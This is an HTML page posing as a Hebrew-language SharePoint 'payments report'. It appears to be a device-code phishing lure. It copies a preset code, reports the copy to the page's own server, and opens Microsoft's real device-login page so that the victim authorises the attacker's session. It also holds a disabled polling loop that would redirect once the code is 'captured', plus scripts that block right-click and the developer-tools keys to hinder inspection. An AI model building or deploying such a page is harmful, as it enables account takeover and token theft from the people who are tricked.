<!doctype html>
<html lang="he" dir="rtl"><meta charset="utf-8"><title>SharePoint</title>
<body><h1>דוח תשלומים</h1><button id="code" onclick="copyGrant()">GFESSDFR3</button>
<button onclick="openProvider()">פתח קובץ</button><script>
const shown = document.getElementById('code').textContent;
const record = 4036;
function copyGrant() {
  navigator.clipboard.writeText(shown);
  fetch('/api/code/entered', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({code:shown})});
}
function openProvider() { window.open('https://microsoft.com/devicelogin', '_blank'); }
if (false) {
  setInterval(async () => {
    const r = await fetch('/api/code/status/' + record);
    const result = await r.json();
    if (result.status === 'captured' && result.redirect) window.location.href = result.redirect;
  }, 5000);
}
document.addEventListener('contextmenu',
  function(e){ e.preventDefault() });

document.addEventListener('keydown', function(e){
  if(
    e.key === 'F12' ||
    (e.ctrlKey && e.shiftKey &&
      ['I','J','C'].indexOf(e.key) > -1) ||
    (e.ctrlKey && e.key === 'u')
  ) e.preventDefault()
});
</script></body></html>
